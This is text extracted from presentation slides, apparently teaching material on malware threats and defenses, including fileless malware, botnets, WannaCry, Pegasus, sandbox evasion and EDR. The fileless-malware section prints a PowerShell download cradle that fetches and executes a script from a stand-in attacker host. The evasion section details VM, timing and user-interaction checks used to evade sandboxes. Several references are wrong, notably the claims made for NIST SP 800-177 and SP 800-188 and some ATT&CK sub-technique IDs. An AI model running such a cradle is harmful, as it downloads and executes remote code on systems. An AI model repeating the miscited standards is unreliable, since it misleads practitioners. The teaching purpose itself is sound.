              <a:t>Detection of metamorphic malware requires behavioral analysis, identifying what the code does rather than what the code looks like. Sandbox-based dynamic analysis executes the suspicious binary in an isolated virtual environment and observes its runtime behavior: what system calls it makes, what files it accesses, what network connections it establishes. Even if the binary's bytes are completely different from all known samples, the behavioral pattern of a keylogger, installing keyboard hooks, writing to a log file, establishing outbound connections, can be detected and flagged. Modern EDR tools (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) use behavioral telemetry streamed in real time from kernel-level sensors to detect metamorphic malware through behavioral signatures rather than byte signatures.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-177 covers malware analysis techniques, and the detection problem is an arms race: antivirus vendors and malware authors adapt to each other continuously. Security is fundamentally a problem of asymmetric information and ongoing adaptation, not a fixed state.</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Logic bombs represent a unique category in the malware taxonomy because they frequently originate from within the organization itself, planted by privileged insiders rather than external adversaries. Unlike viruses or worms that must overcome perimeter defenses to reach their target, a logic bomb is written and inserted directly into the target system's legitimate code by someone who already has authorized access. This insider placement eliminates the need for propagation and bypasses all external defensive controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The defining characteristic of a logic bomb is conditional execution: the malicious payload remains completely dormant, functionally invisible, until a specific trigger condition is satisfied. The most common trigger type is temporal, where the bomb checks the current system date and time against a hardcoded target. The Michelangelo virus (1991) used this mechanism precisely: it activated every year on March 6, the birthday of Renaissance artist Michelangelo, overwriting the first 100 sectors of the hard drive. More sophisticated time triggers check for a specific date after a known future event, such as a contract renewal date or a workforce reduction announcement, that the insider anticipates.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Negative condition triggers, sometimes called "dead man's switch" bombs, are particularly insidious. In these designs, the bomb checks for the existence of a specific file, database record, or user account. As long as the expected condition persists (the file exists, the account is active), the bomb remains dormant. If the condition disappears, for example, when a disgruntled employee is terminated and their account is disabled, the bomb interprets the absence as its trigger and executes. This design is elegant from an attacker's perspective: the insider does not need to take any action after planting the bomb; the organization's own routine administrative procedures (disabling accounts upon termination) detonate it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Real-world cases demonstrate the professional risk of logic bombs from insiders. In 2006, Roger Duronio, a disgruntled UBS PaineWebber system administrator, planted a logic bomb that deleted files on over 1,000 servers simultaneously, causing an estimated $3.1 million in direct damages and disrupting securities trading. He was convicted under 18 U.S.C. § 1030 (the Computer Fraud and Abuse Act) and sentenced to 97 months in prison. In 2016, a Siemens contractor planted logic bombs in power station systems to ensure he would be called back repeatedly to resolve the issues, a financially motivated variant rather than a sabotage motive.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-53 provides several relevant controls for logic bomb detection and prevention. SA-11 (Developer Security Testing and Evaluation) mandates code security reviews during development and before deployment. CM-3 (Configuration Change Control) requires approval workflows for all code changes, limiting opportunities for unauthorized code insertion. SI-7 (Software, Firmware, and Information Integrity) mandates integrity verification of installed software. The human process control of mandatory dual-person code review, where no code change can be deployed without independent approval from a second developer, is arguably the most effective preventive control, as it eliminates the opportunity for a single insider to insert malicious code undetected.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>CERT/Carnegie Mellon research finds that insiders who plant logic bombs usually show detectable behavioral indicators, grievances, policy violations and performance problems, weeks to months before acting. A complete insider-threat program therefore combines technical controls with behavioral monitoring and employee well-being support.</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Traditional malware detection rests on a foundational assumption that has been systematically invalidated over the past decade: that malware must write an executable file to disk in order to function. File-scanning antivirus tools, the historical backbone of endpoint security, operate by scanning the file system for executables with known malicious signatures or suspicious attributes. Fileless malware was designed specifically to undermine this model by executing entirely within legitimate operating system processes and volatile memory, never writing a traditional executable to disk where a scanner could find it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The term "fileless" is somewhat misleading, the initial delivery mechanism often does involve a file, typically a malicious email attachment such as a Microsoft Office document containing a macro. However, once that macro executes, all subsequent malicious activity occurs entirely in memory, using the operating system's own legitimate tools and interpreter processes. This technique is often called "Living off the Land" (LotL), because the malware "lives off" the legitimate resources already present on the host rather than bringing its own tools.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The execution chain typically starts with a malicious Office macro that, when enabled by the user, invokes Windows Management Instrumentation (WMI) or directly calls the PowerShell interpreter. The PowerShell command uses a download cradle, a one-liner like IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1'), to fetch the second-stage payload as a string from the attacker's server and immediately execute it without saving it to disk. The second stage performs reflective DLL injection: it loads a compiled DLL payload directly into the memory space of a legitimate running process without using the standard Windows DLL loading APIs that write the DLL to a temp location on disk. Sysmon and EDR tools can detect this because the DLL appears loaded in process memory without a corresponding file on disk, a strong anomalous indicator.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For persistence, fileless malware uses WMI Event Subscriptions, a legitimate Windows management feature that executes a command when a specified system event occurs (such as user logon or a specific time of day). The subscription is stored entirely in the WMI repository database (a legitimate OS component), and the malicious command it contains is a PowerShell download cradle that re-establishes the memory-resident payload on each trigger. No files are written to disk except the legitimate WMI repository, making this persistence mechanism exceptionally difficult to detect with file-based controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Poweliks malware family (2014) was one of the first widely documented fileless malware campaigns to store its entire payload in the Windows Registry and execute through a legitimate process (dllhost.exe). Operation Cobalt Kitty (2017), attributed to the OceanLotus APT group, used a fully fileless attack chain to compromise a large Asian corporation's internal networks for over six months. CVE-2017-0199, a Microsoft Office exploit, was widely used to deliver fileless payloads via malicious RTF documents.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Detection requires shifting from file-scanning to behavior-based monitoring. Microsoft Sysmon (Event ID 7: Image Load, Event ID 8: CreateRemoteThread) provides the kernel-level telemetry needed to detect reflective DLL injection and process injection. PowerShell Script Block Logging (enabled via Group Policy) records all PowerShell scripts before they execute, even if they are never saved to disk, giving SOC analysts complete visibility into PowerShell-based fileless attacks. AMSI (Antimalware Scan Interface), introduced in Windows 10, allows AV products to scan script content at execution time, providing a detection point even for in-memory scripts.</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botnet transforms individual compromised hosts from standalone incidents into coordinated weapons. The term derives from "robot network", each infected host runs an automated agent (the bot) that awaits instructions from a central orchestrator, enabling the botmaster to direct thousands or millions of machines simultaneously with a single command. The scale achievable by botnets makes them qualitatively different from any attack that could be launched from a single host.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The evolution of botnet C2 architecture reflects a continuous arms race between botnet operators and law enforcement. First-generation botnets used IRC (Internet Relay Chat) channels as command servers, bots would connect to a specific IRC server and channel, waiting for commands posted by the botmaster. Law enforcement agencies could take down these botnets by identifying and seizing the IRC server, immediately cutting off all bot communications. The GBot and GTbot families of the early 2000s exemplified this centralized model.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Second-generation botnets introduced HTTP-based C2 panels, hosted on bulletproof hosting providers in jurisdictions with limited law enforcement cooperation. Tools like Zeus and SpyEye provided web-based dashboards allowing botmasters to manage tens of thousands of infected machines, view harvested credentials, and issue mass commands. While more resilient than IRC-based C2 through geographic diversification, these still had identifiable central infrastructure that could be disrupted through international law enforcement coordination.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Third-generation botnets introduced Domain Generation Algorithms (DGAs), a technique that fundamentally changed the dynamics of botnet disruption. In a DGA-based botnet, both the bot malware and the C2 infrastructure independently calculate the same list of pseudo-random domain names for a given date using a shared seed value and algorithm. Each day, the bot attempts to contact hundreds of generated domain names; the botmaster only needs to register one of those domains per day to maintain C2 communication. Because defenders cannot know in advance which domain the botmaster will register, blacklisting or sinkholing requires reverse-engineering the DGA algorithm, a significant technical challenge. The Conficker worm used a DGA that generated up to 50,000 domain names per day across multiple top-level domains, making preemptive blocking nearly impossible.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The most resilient architecture is fully peer-to-peer (P2P) C2, used by botnets like ZeroAccess and Kelihos. In a P2P botnet, there is no central server at all. Bots maintain a list of other bot IP addresses (the peer list) and communicate directly with each other, relaying commands and updates through the peer network. Disrupting a P2P botnet requires a coordinated "sinkhole" operation in which security researchers inject specially crafted P2P messages to redirect bots away from legitimate peer nodes, a complex and resource-intensive operation that has had limited long-term success.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Emotet botnet, dismantled by a coordinated Europol/Eurojust operation in January 2021, demonstrated the real-world scale of modern botnets. At its peak, Emotet had infected over 1.6 million machines globally and was described by Europol as "the world's most dangerous malware." The takedown required simultaneous action in eight countries, replacing the Emotet C2 module on infected machines with a "clean-up" version that disconnected them from the botnet. Despite the takedown, Emotet resurged in November 2021 under the control of former affiliates.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Large botnets are financial assets rented out as a service for specific campaigns, producing a layered criminal economy in which botnet operators, malware developers and end-use attackers may be separate parties who never communicate directly.</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Despite decades of security awareness training and increasingly sophisticated email security technologies, phishing remains the most successful initial access vector for malware delivery. Verizon's Data Breach Investigations Report (DBIR) consistently identifies phishing as the top action in confirmed breaches, accounting for approximately 36% of all breaches in 2023. The reason for phishing's persistent effectiveness is that it targets the most difficult-to-patch vulnerability in any organization: human psychology.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The technical mechanics of phishing have evolved significantly beyond the crude "Nigerian Prince" scams of the late 1990s. Modern phishing campaigns use open-source intelligence (OSINT) gathering to personalize lure emails with specific details about the target, their name, job title, reporting manager, current projects, or even their writing style, harvested from LinkedIn, corporate websites, and social media. This personalization dramatically increases the credibility of the lure and the likelihood that the target will comply. A generic "Your package could not be delivered" email may have a 1–2% click rate; a spear phishing email that references a specific ongoing business transaction by name may achieve click rates exceeding 50%.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Malware delivery through phishing typically uses one of two techniques. The first is malicious document delivery: the email contains an Office document (.docx.xlsx.pptx.pdf) with embedded macros, exploits for document parser vulnerabilities (such as CVE-2021-40444, a Microsoft MSHTML remote code execution vulnerability exploited through .docx files), or hyperlinks to files hosted on legitimate cloud storage services (Google Drive, OneDrive, Dropbox) to bypass URL reputation filters. When the document is opened and the user enables macros (or the exploit fires without user interaction), the malware payload executes.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The second technique is credential harvesting: the email contains a link to a convincingly cloned login page for a legitimate service (Microsoft 365, Google Workspace, banking portals) that captures the user's username and password when entered. The attacker then uses these credentials to log into corporate services directly, bypassing endpoint security entirely, or sells them on underground marketplaces.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The NIST Phishing Protection Framework (published as supplementary material to SP 800-177) recommends layered technical controls: email authentication standards (SPF, DKIM, DMARC) to prevent domain spoofing; email gateway filtering with sandboxing for attachments; URL reputation filtering to block known phishing domains; multi-factor authentication (MFA) to prevent credential theft from enabling account takeover; and regular phishing simulation campaigns to measure and improve user recognition of phishing attempts. The human element remains essential, studies show that organizations that conduct regular phishing simulations and training reduce click rates from 30% to under 5% over 12 months.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Open-source phishing-simulation frameworks make convincing campaigns easy to build, and the same tools used for authorized awareness testing are freely available to attackers. Phishing defenses must therefore assume sophisticated, personalized attacks, not just generic spam.</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When a new or suspected malware specimen is discovered, through an alert, an incident, or a threat intelligence feed, security analysts perform malware analysis to understand what the malware does, how it persists, what network infrastructure it communicates with, and what artifacts it leaves on compromised systems. This understanding is essential for three purposes: creating detection rules to identify other systems infected with the same malware, developing remediation procedures to remove the infection, and contributing to the broader threat intelligence community.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Static analysis examines the binary file without executing it, making it inherently safe, the analyst cannot accidentally trigger the malware's payload in a live environment. The most basic static analysis technique is computing a cryptographic hash (MD5, SHA-1, SHA-256) of the binary and searching it in threat intelligence databases such as VirusTotal or MalwareBazaar to check if the specimen has already been analyzed. If the hash is unknown, the analyst extracts printable strings from the binary using the Unix strings utility or dedicated tools, this often reveals embedded C2 domain names, IP addresses, registry key paths, file paths, and error messages that the malware developer left in plaintext. The Windows API imports table is particularly revealing: a binary that imports CreateRemoteThread, VirtualAllocEx, and WriteProcessMemory is almost certainly performing process injection; one that imports CryptEncrypt and FindFirstFile is likely ransomware.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For sophisticated malware that has been packed (compressed and encrypted) to hide its true code, analysts use PE header analysis to identify the packer (UPX, Themida, ASPack) and apply automated or manual unpacking techniques to reveal the true payload before further analysis. Disassemblers like Ghidra (released by the NSA as open-source software) and IDA Pro translate the binary machine code back into assembly-language instructions, allowing analysts to trace the malware's control flow and identify specific functional modules.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Dynamic analysis sacrifices safety for completeness: the malware is actually executed in a controlled, isolated sandbox environment (an isolated virtual machine with no real network connectivity except to a simulated network under analyst control) while comprehensive monitoring tools capture every observable system event. The Cuckoo Sandbox is the most widely used open-source dynamic analysis platform, it automatically executes the sample, captures all system calls, file system changes, registry modifications, network traffic, and process activity, then generates a structured behavioral report. Online sandboxes like ANY.RUN provide a browser-based interactive dynamic analysis environment.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The primary limitation of sandbox-based dynamic analysis is evasion. Sophisticated malware includes sandbox detection logic that checks for indicators of a virtual environment: the presence of VM tools processes (vmtoolsd.exe, vboxservice.exe), unusually low mouse cursor entropy (automated sandboxes do not move the mouse), lack of internet connectivity, or specific hardware fingerprints (VM network card MAC address prefixes). If the malware detects a sandbox environment, it deactivates, appearing benign during analysis while remaining functional on real targets. Defenders counter this with "bare metal" analysis environments (real physical hardware, not VMs), human interaction simulation (automated mouse movement, browser activity), and network-connected sandboxes that allow limited real internet access.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The outputs of both analysis tracks converge on indicators of compromise (IOCs): file hashes, domain names, IP addresses, registry keys, file paths, and behavioral patterns that can be translated into detection signatures for SIEM systems (Sigma rules), endpoint detection products (YARA rules), and network intrusion detection systems (Snort/Suricata rules). Sharing these IOCs through threat intelligence platforms (MISP, OpenCTI) following the STIX/TAXII standard enables the broader security community to rapidly detect the same malware across many organizations.</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WannaCry fundamentally changed the threat landscape in May 2017 by demonstrating that ransomware and worm propagation could be combined into a single, self-spreading weapon. Every previous major ransomware campaign had required some degree of user interaction to initiate each infection, clicking a phishing link, opening an attachment, or using an infected removable drive. WannaCry required nothing from its victims. It arrived uninvited through the network and installed itself silently at the kernel level, making it the first ransomware variant capable of disabling an entire global organization's network infrastructure without a single employee making a mistake.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The technical foundation of WannaCry was two cyberweapons developed by the U.S. National Security Agency (NSA) and subsequently stolen and publicly released by the Shadow Brokers hacking group in April 2017, just 28 days before WannaCry deployed them at global scale. EternalBlue (CVE-2017-0144) exploits a heap buffer overflow in the Windows Server Message Block (SMBv1) protocol handler in the kernel driver srv.sys. By sending a specially crafted SMB NEGOTIATE request followed by a SESSION_SETUP packet, the exploit triggers the buffer overflow, allowing arbitrary code to execute with SYSTEM-level privileges (the highest privilege level on a Windows system) on unpatched systems. Microsoft had released patch MS17-010 on March 14, 2017, 59 days before WannaCry, but millions of systems remained unpatched.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>DoublePulsar, the second NSA tool, is a kernel-mode backdoor that EternalBlue installs as its immediate payload. DoublePulsar injects shellcode into system processes and provides a covert channel for delivering additional payloads. WannaCry used DoublePulsar to inject its ransomware DLL into the lsass.exe process, achieving execution without writing the DLL to disk in the standard way, a fileless delivery component embedded within a worm.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The human impact was severe and immediate. The UK's National Health Service (NHS) experienced one of its worst technology failures in history: 80 of 236 NHS trusts had systems affected, 19,000 appointments cancelled, five hospitals turned away non-emergency patients, and ambulances diverted from affected facilities. Spanish telecommunications giant Telefónica, Russian Interior Ministry networks, Germany's Deutsche Bahn railway (causing departure board failures), and FedEx's TNT Express subsidiary (causing $300 million in losses) were all severely impacted within the first 24 hours.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The kill switch mechanism was an extraordinary defensive stroke of luck. Marcus Hutchins, a 22-year-old British security researcher, was analyzing WannaCry's code when he noticed that before executing its payload, the malware made an HTTP request to a long, apparently random domain name and only continued execution if the request failed (i.e., if the domain did not exist). This "inoculation check" was likely intended as an anti-sandbox mechanism, if the domain did resolve (as all domains do in some sandbox environments that redirect all DNS queries), the malware assumed it was in a sandbox and deactivated. Hutchins registered the domain for approximately $10.69. Within minutes, WannaCry samples checking this domain received a response, and new infections worldwide stopped. The U.S. government later attributed WannaCry to the Lazarus Group, a North Korean state-sponsored threat actor.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The WannaCry incident produced lasting changes in organizational security practices. It demonstrated that critical infrastructure organizations (healthcare, transportation, utilities) must prioritize vulnerability patching even for legacy systems they consider too important to take offline for maintenance. It also spurred the adoption of network segmentation and SMBv1 disabling as mandatory security baselines, highlighted in CISA Alert AA20-302A and MS-ISAC guidelines.</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Pegasus represents the most technically sophisticated mobile spyware platform ever publicly documented, and its exposure has fundamentally reshaped the global conversation about the legality, ethics, and regulation of commercial surveillance technology. Developed by the NSO Group, an Israeli cybersecurity company founded in 2010, Pegasus is marketed exclusively to government clients, specifically law enforcement and intelligence agencies, for "lawful interception" of criminal and terrorist suspects. However, the Pegasus Project investigation, a collaborative effort by 17 media organizations including the Washington Post, Le Monde, and The Guardian, published in July 2021 using forensic analysis by Amnesty International's Security Lab, revealed that Pegasus had been used to target at least 180 journalists, 85 human rights activists, 65 business executives, 600 politicians, and 14 heads of state or prime ministers across 50 countries.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The technical evolution of Pegasus demonstrates the cutting edge of mobile exploitation research. Early Pegasus variants (2016) used "one-click" spear phishing: malicious SMS or WhatsApp messages containing URLs that, when tapped, loaded a browser exploit chain targeting a WebKit vulnerability (CVE-2016-4655, CVE-2016-4656, CVE-2016-4657). These attacks were discovered by the Citizen Lab after Ahmed Mansoor, a UAE human rights defender, was suspicious of the texts he received and forwarded them to researchers rather than tapping them.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>By 2021, NSO Group had developed "zero-click" exploitation, attacks that compromise the target device without any user interaction whatsoever. The FORCEDENTRY exploit (CVE-2021-30860, CVSS Score 7.8) exploited a heap buffer overflow in Apple's CoreGraphics library, which is responsible for rendering image files. NSO Group discovered that iOS automatically renders iMessage attachments in a preview engine, and that by crafting a malicious PDF file using the JBIG2 image compression format, they could trigger the overflow and achieve arbitrary code execution within the iMessage process, all triggered solely by the device receiving the message, before the user even sees a notification. Apple patched FORCEDENTRY in iOS 14.8, released on September 13, 2021, following emergency disclosure by Google Project Zero and Citizen Lab.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Once Pegasus has code execution, it performs a full jailbreak-equivalent privilege escalation using a chain of kernel exploits to gain root access, bypassing Apple's application sandboxing, code signing enforcement, and Pointer Authentication Code (PAC) security mechanisms. With root access, Pegasus installs itself in protected system directories, adjusts system configurations to prevent its own discovery, and begins its surveillance mission. The platform has modules for: real-time audio capture from the device microphone (activated remotely); camera activation (front and rear); real-time GPS location tracking; extraction of all stored messages (including end-to-end encrypted Signal and WhatsApp messages, accessed after decryption on the device); call recordings; email access; and exfiltration of all contacts and photos.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Pegasus case raises profound questions about the dual-use nature of offensive security capabilities and their potential for misuse. NIST SP 800-188 (De-Identifying Government Datasets) and ISO/IEC 29101 (Privacy Architecture Framework) both emphasize that surveillance capabilities must be subject to rigorous legal oversight and technical safeguards. Apple's Lockdown Mode, introduced in iOS 16, reduces the iOS attack surface specifically for high-risk individuals by disabling features like iMessage link previews and just-in-time JavaScript compilation, trading functionality for a dramatically reduced zero-click attack surface.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Commercial spyware such as NSO Group's Pegasus raises the ethics of dual-use surveillance tools, as reflected in NSO's legal challenges across jurisdictions and Apple's suit against it. The line between lawful interception and surveillance abuse is a genuine policy question.</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MITRE ATT&amp;CK framework, first published in 2015 by the MITRE Corporation (a nonprofit operating federally funded research and development centers), has become the de facto global standard for structured threat intelligence and security operations. Unlike generic vulnerability databases like the CVE list, ATT&amp;CK describes not just what vulnerabilities are exploited but the complete behavioral profile of how adversaries operate from initial access through final impact. This behavioral focus is what makes ATT&amp;CK so powerful for detection engineering: even if a specific malware's binary signature is unknown, if it uses a technique cataloged in ATT&amp;CK, there is likely an existing behavioral detection approach documented in the framework.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The ATT&amp;CK matrix organizes adversary behavior into 14 high-level Tactics (the "why", what the attacker is trying to achieve), each containing multiple Techniques (the "how", specific methods of achieving the tactic) and Sub-techniques (more granular variations of a technique). For example, the Persistence tactic (TA0003) documents over 19 techniques for maintaining access across reboots, including Boot or Logon Autostart Execution (T1547) with sub-techniques covering Registry Run Keys (T1547.001), Startup Folder entries (T1547.011), and scheduled tasks (T1547.005). Each technique page includes a description, real-world procedure examples from known threat actors, detection recommendations, and mitigation guidance.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For malware analysis, the ATT&amp;CK framework provides two immediate practical benefits. First, when analysts discover behaviors during dynamic analysis (for example, they observe the malware making a CreateRemoteThread call into another process's memory space), they can directly map this behavior to an ATT&amp;CK technique (T1055.001, Dynamic-link Library Injection) and immediately access detection guidance, related procedures, and known threat groups that use this technique. Second, threat intelligence sharing using ATT&amp;CK technique IDs creates a common vocabulary across organizations and commercial threat intelligence feeds, enabling rapid correlation between seemingly unrelated incidents.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Security operations centers use the ATT&amp;CK Navigator, a freely available browser-based tool, to create visual heat maps showing which techniques their existing detection coverage addresses and which represent blind spots. An organization might overlay their SIEM detection rules onto the Navigator matrix to discover that they have excellent coverage for Initial Access and Execution techniques but no detection capability for Lateral Movement or Defense Evasion techniques, immediately identifying investment priorities for detection engineering.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The MITRE ATT&amp;CK for Enterprise matrix covers Windows, macOS, Linux, cloud environments (AWS, Azure, GCP, M365), network infrastructure, and containers. There are also dedicated ATT&amp;CK matrices for Industrial Control Systems (ATT&amp;CK for ICS) and Mobile platforms (ATT&amp;CK for Mobile), making it a comprehensive framework for virtually every environment a security team must defend.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-53 Rev. 5 explicitly references ATT&amp;CK as a complementary resource for implementing the SI-4 (System Monitoring) control family. CISA frequently publishes ATT&amp;CK-mapped advisories for specific threat actors and malware families, such as the joint CISA/NSA advisory on Russian SVR cyber operations (AA21-116A) and the BlackMatter ransomware advisory (AA21-291A), making ATT&amp;CK fluency an essential professional skill for threat analysts and SOC staff.</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tension between malware analysis techniques and malware evasion is one of the most active arms races in cybersecurity. As sandbox-based dynamic analysis became the industry standard for automated malware detection, malware authors responded by building increasingly sophisticated environment fingerprinting logic into their code. The goal is simple: if the malware can determine it is running inside a sandbox rather than on a real user's system, it can deactivate, appear benign, and avoid generating the behavioral signatures that would lead to its detection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>VM artifact detection is the most basic evasion technique. Virtual machine environments, VMware Workstation, VirtualBox, Microsoft Hyper-V, KVM, leave numerous fingerprints that distinguish them from physical hardware. The Windows registry under VMware environments contains keys like HKLM\SOFTWARE\VMware, Inc.\VMware Tools, and processes like vmtoolsd.exe and vmwaretray.exe run in the background. VirtualBox creates driver files with names like VBoxGuest.sys and VBoxSF.sys. Malware authors compile lists of hundreds of VM artifacts and check for their presence at startup. If any are detected, the malware either terminates immediately or enters a permanent sleep loop, in either case, the sandbox reports no malicious behavior.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Timing-based evasion exploits a fundamental property of many sandbox environments: to analyze more samples in a given time window, some sandboxes use time acceleration, artificially advancing the system clock or skipping sleep calls. Malware can detect this by recording a timestamp at startup using the high-resolution performance counter (QueryPerformanceCounter), calling Sleep(10000) (requesting 10 seconds of sleep), then checking the counter again. If less than 10 seconds of real time has elapsed, the sandbox accelerated through the sleep, revealing itself. Alternatively, malware performs compute-intensive operations (calculating thousands of MD5 hashes) and measures the wall-clock time, on a real CPU this takes a predictable amount of time; on an overcommitted VM host shared with many other sandboxes, timing may be inconsistent.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Human interaction detection is particularly challenging for sandbox operators. Malware checks the current mouse cursor position repeatedly over several seconds and verifies that it has moved. A real user moves the mouse continuously; an automated sandbox without cursor simulation leaves the cursor stationary. Similarly, malware can check the clipboard contents (a real user's clipboard contains copied text; a fresh sandbox clipboard is empty), the number of recently accessed files in the jump list (real systems accumulate user file history; a clean VM has none), the number of installed fonts (real systems have hundreds of fonts installed by applications; clean VMs have only the OS defaults), and whether any applications have been installed beyond the OS defaults.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Counter-evasion techniques have evolved substantially. The Cuckoo Sandbox project includes auxiliary modules that simulate cursor movement, keyboard events, and application launches during analysis. "Bare metal" analysis (running malware on physical hardware rather than VMs) eliminates all VM artifact checks, though it is substantially more operationally complex because recovering from a malware infection on a physical machine requires re-imaging rather than simple snapshot rollback. Some platforms combine physical and virtual analysis to compare results and identify samples that behave differently in each environment, a strong indicator of evasion.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Extended execution time has also proven valuable. Many time-delayed malware variants sleep for 30 minutes or more before activating, expecting that automated sandbox analysis will time out before the payload executes. Running samples for 30–60 minutes rather than the typical 2–5 minutes catches these delayed detonations. Similarly, running samples multiple times in the same session can reveal trigger conditions that require specific environmental state, for example, a logic bomb that only activates on a specific calendar date requires the sandbox to set its system clock to the trigger date.</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evolution from traditional antivirus (AV) to Endpoint Detection and Response (EDR) marks a fundamental paradigm shift in endpoint security philosophy. Traditional AV operates on a detection model: it scans files against a database of known malicious signatures and blocks those that match. This approach is reactive (requires a known signature to exist), easily evaded by polymorphic and fileless malware, and provides no visibility into what is happening on the endpoint beyond file scans. EDR inverts this model: instead of looking for known-bad files, it continuously records everything that happens on the endpoint and detects malicious behavior by identifying suspicious activity patterns, regardless of whether the underlying binary has ever been seen before.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The technical foundation of EDR is the kernel sensor, a lightweight device driver or kernel extension that installs in the operating system kernel and registers callbacks for every significant system event. On Windows, this means registering PsSetCreateProcessNotifyRoutine callbacks for process creation, PsSetLoadImageNotifyRoutine for DLL loading, CmRegisterCallback for registry operations, minifilter drivers for file system events, and network filter drivers (NDIS filters or WFP callouts) for network connections. Every event is timestamped and attributed to the responsible process, creating a complete chronological audit trail of all system activity. Critically, because the sensor operates in the kernel, it captures events before the target process has any opportunity to modify or hide them, a rootkit attempting to conceal its activities through API hooking cannot hide from a kernel sensor that captures the underlying event before the hook can intercept it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The behavioral detection layer analyzes the continuous event stream for sequences that match known malicious patterns. A paradigmatic example: Microsoft Word (winword.exe) spawning cmd.exe as a child process, which then spawns powershell.exe, which makes a network connection to an external IP address, this sequence strongly indicates a macro-based Trojan delivery chain. No individual event is inherently malicious (Word can legitimately spawn processes, PowerShell can legitimately make network connections), but the combination of events in that specific parent-child sequence is characteristic of a well-documented attack pattern. EDR behavioral detection encodes hundreds of such multi-step activity chains as detection rules, firing alerts when the pattern is observed regardless of what the underlying binary looks like.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Threat hunting extends EDR beyond passive alerting into proactive investigation. Because EDR stores 30–90 days of complete endpoint telemetry, SOC analysts can write structured queries across all endpoints to search for subtle indicators of compromise that did not trigger automated alerts. For example, a threat hunter might query for all processes that loaded WinInet.dll (HTTP library) and made connections to external IPs in the past 30 days, filtered to processes that are not themselves browsers or known update agents, a query that would surface potential C2 beaconing from unexpected processes.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
